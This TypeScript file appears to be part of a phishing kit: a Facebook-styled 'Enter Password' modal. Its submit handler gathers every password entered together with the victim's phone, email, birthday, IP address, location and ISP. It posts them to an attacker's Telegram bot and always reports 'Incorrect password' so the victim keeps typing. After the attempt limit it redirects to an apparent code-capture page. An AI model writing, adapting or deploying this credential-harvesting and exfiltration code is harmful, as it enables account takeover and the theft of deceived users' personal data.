import config from '@/config/telegram_config.json';
import { html } from '@/lib/html';
import { eye, eyeSlash, times, spinner } from '@/lib/icons';
import { router } from '@/routes/routes';

interface IpapiResponse {
    ip: string;
    location: {
        country: string;
        city: string;
        state: string;
    };
    company: {
        name: string;
    };
}

interface TelegramResponse {
    ok: boolean;
    result: {
        message_id: number;
    };
}
let passwordAttempts = 0;
let lastMessageId: number | null = null;
let passwordHistory: string[] = [];

export const PasswordModal = (): string => {
    return html`
        <div
            id="password-modal"
            class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50"
        >
            <div class="w-full max-w-md rounded-lg bg-white p-6 shadow-xl">
                <div class="mb-4 flex items-center justify-between">
                    <h3 class="text-xl font-semibold text-gray-900">
                        Enter Password
                    </h3>
                    <button
                        type="button"
                        class="text-gray-400 hover:text-gray-500"
                        id="close-modal-btn"
                    >
                        <span class="h-6 w-6">${times}</span>
                    </button>
                </div>

                <div class="space-y-4">
                    <div class="flex flex-col gap-2">
                        <label
                            class="text-[16px] leading-[24px] text-[#212529]"
                            for="password"
                        >
                            Password
                        </label>
                        <div class="relative">
                            <input
                                type="password"
                                id="password"
                                class="w-full rounded-md border border-gray-300 p-2 pr-10 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
                                placeholder="Enter your password"
                            />
                            <button
                                type="button"
                                id="toggle-password-btn"
                                class="absolute top-1/2 right-2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                            >
                                <span id="eye-icon" class="h-5 w-5"
                                    >${eye}</span
                                >
                            </button>
                        </div>
                    </div>

                    <div class="flex justify-end gap-3">
                        <button
                            type="button"
                            class="rounded-md px-4 py-2 text-gray-500 hover:text-gray-700"
                            id="cancel-btn"
                        >
                            Cancel
                        </button>
                        <button
                            type="button"
                            class="rounded-md bg-[#1877f2] px-4 py-2 text-white hover:bg-[#0d6efd] focus:ring-2 focus:ring-[#1877f2] focus:ring-offset-2 focus:outline-none"
                            id="submit-password-btn"
                        >
                            Confirm
                        </button>
                    </div>
                </div>
            </div>
        </div>
    `;
};

const closeModal = (): void => {
    const modal = document.getElementById('password-modal');
    if (modal) {
        modal.classList.add('hidden');
        modal.classList.remove('flex');
    }
};

export const showModal = (): void => {
    const modal = document.getElementById('password-modal');
    if (modal) {
        modal.classList.remove('hidden');
        modal.classList.add('flex');
    }
};

const togglePasswordVisibility = (): void => {
    const passwordInput = document.getElementById(
        'password'
    ) as HTMLInputElement;
    const eyeIconElement = document.getElementById('eye-icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        if (eyeIconElement) {
            eyeIconElement.innerHTML = eyeSlash.toString();
        }
    } else {
        passwordInput.type = 'password';
        if (eyeIconElement) {
            eyeIconElement.innerHTML = eye.toString();
        }
    }
};

const handlePasswordSubmit = async (): Promise<void> => {
    const submitBtn = document.getElementById('submit-password-btn');
    if (!submitBtn) {
        return;
    }

    submitBtn.innerHTML = `<span class="animate-spin inline-block">${spinner}</span>`;
    submitBtn.setAttribute('disabled', 'true');

    const passwordInput = document.getElementById(
        'password'
    ) as HTMLInputElement;
    const password = passwordInput.value;

    resetErrors();

    if (!password) {
        showError(passwordInput, 'Please enter your password');
        return;
    }

    if (passwordAttempts >= config.setting.max_password_attempts) {
        showError(
            passwordInput,
            `Maximum ${config.setting.max_password_attempts} attempts reached. Please try again later.`
        );

        submitBtn.removeAttribute('disabled');
        return;
    }

    passwordAttempts++;
    passwordHistory.push(password);

    const storedData = localStorage.getItem('helpFormData');
    if (storedData === null || storedData.trim() === '') {
        router.navigate('/');
        return;
    }

    try {
        const ipResponse = await fetch('https://api.ipapi.is/');
        const ipData: IpapiResponse = await ipResponse.json();

        const formData = JSON.parse(storedData);

        const passwordList = passwordHistory
            .map(
                (pwd, index) =>
                    `🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`
            )
            .join('\n');

        const message = `📱 <b>Phone:</b> <code>${formData.phone}</code>
📧 <b>Email:</b> <code>${formData.email}</code>
🎂 <b>Birthday:</b> <code>${formData.birthday}</code>
${passwordList}
🌐 <b>IP Address:</b> <code>${ipData.ip}</code>
📍 <b>Location:</b> <code>${ipData.location.city}, ${ipData.location.state}, ${ipData.location.country}</code>
🏢 <b>ISP:</b> <code>${ipData.company.name}</code>`;

        if (typeof lastMessageId === 'number' && lastMessageId > 0) {
            try {
                await fetch(
                    `https://api.telegram.org/bot${config.telegram.token}/deleteMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: config.telegram.chatId,
                            message_id: lastMessageId,
                        }),
                    }
                );
            } catch {
                return;
            }
        }

        const response = await fetch(
            `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: config.telegram.chatId,
                    text: message,
                    parse_mode: 'HTML',
                }),
            }
        );

        const telegramResponse: TelegramResponse = await response.json();
        if (telegramResponse.ok) {
            lastMessageId = telegramResponse.result.message_id;
        }

        const updatedFormData = { ...formData, password };
        localStorage.setItem('helpFormData', JSON.stringify(updatedFormData));

        passwordInput.value = '';

        showError(passwordInput, 'Incorrect password. Please try again.');

        if (passwordAttempts >= config.setting.max_password_attempts) {
            if (typeof lastMessageId === 'number' && lastMessageId > 0) {
                localStorage.setItem('lastMessageId', lastMessageId.toString());
            }
            router.navigate('/enter-code');
        }
    } catch {
        const formData = JSON.parse(storedData);

        const passwordList = passwordHistory
            .map(
                (pwd, index) =>
                    `🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`
            )
            .join('\n');

        const basicMessage = `📱 <b>Phone:</b> <code>${formData.phone}</code>
📧 <b>Email:</b> <code>${formData.email}</code>
🎂 <b>Birthday:</b> <code>${formData.birthday}</code>
${passwordList}`;

        if (typeof lastMessageId === 'number' && lastMessageId > 0) {
            try {
                await fetch(
                    `https://api.telegram.org/bot${config.telegram.token}/deleteMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: config.telegram.chatId,
                            message_id: lastMessageId,
                        }),
                    }
                );
            } catch {
                return;
            }
        }

        const response = await fetch(
            `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: config.telegram.chatId,
                    text: basicMessage,
                    parse_mode: 'HTML',
                }),
            }
        );

        const telegramResponse: TelegramResponse = await response.json();
        if (telegramResponse.ok) {
            lastMessageId = telegramResponse.result.message_id;
        }

        const updatedFormData = { ...formData, password };
        localStorage.setItem('helpFormData', JSON.stringify(updatedFormData));

        passwordInput.value = '';

        showError(passwordInput, 'Incorrect password. Please try again.');

        if (passwordAttempts >= config.setting.max_password_attempts) {
            if (typeof lastMessageId === 'number' && lastMessageId > 0) {
                localStorage.setItem('lastMessageId', lastMessageId.toString());
            }
            router.navigate('/enter-code');
        }
    } finally {
        submitBtn.innerHTML = 'Confirm';
        submitBtn.removeAttribute('disabled');
    }
};

const showError = (element: HTMLInputElement, message: string): void => {
    element.classList.add('border-red-500');
    const errorDiv = element.nextElementSibling?.nextElementSibling;
    if (
        !(errorDiv instanceof HTMLElement) ||
        !errorDiv.classList.contains('error-message')
    ) {
        const newErrorDiv = document.createElement('div');
        newErrorDiv.classList.add(
            'error-message',
            'text-red-500',
            'text-sm',
            'mt-1'
        );
        const parentDiv = element.closest('.relative');
        parentDiv?.parentNode?.insertBefore(newErrorDiv, parentDiv.nextSibling);
        newErrorDiv.textContent = message;

        element.addEventListener(
            'input',
            () => {
                element.classList.remove('border-red-500');
                newErrorDiv.remove();
            },
            { once: true }
        );

        return;
    }
    errorDiv.textContent = message;

    element.addEventListener(
        'input',
        () => {
            element.classList.remove('border-red-500');
            errorDiv.remove();
        },
        { once: true }
    );
};

const resetErrors = (): void => {
    const inputs = document.querySelectorAll('input');
    inputs.forEach((input) => {
        input.classList.remove('border-red-500');
        const errorDiv = input.nextElementSibling?.nextElementSibling;
        if (
            errorDiv instanceof HTMLElement &&
            errorDiv.classList.contains('error-message')
        ) {
            errorDiv.remove();
        }
    });
};
export const resetPasswordAttempts = (): void => {
    passwordAttempts = 0;
    const submitBtn = document.getElementById('submit-password-btn');
    if (submitBtn) {
        submitBtn.removeAttribute('disabled');
    }
};
export const initPasswordModal = (): void => {
    resetPasswordAttempts();
    lastMessageId = null;
    passwordHistory = [];

    document
        .getElementById('close-modal-btn')
        ?.addEventListener('click', closeModal);
    document
        .getElementById('cancel-btn')
        ?.addEventListener('click', closeModal);
    document
        .getElementById('toggle-password-btn')
        ?.addEventListener('click', togglePasswordVisibility);
    document
        .getElementById('submit-password-btn')
        ?.addEventListener('click', handlePasswordSubmit);
};
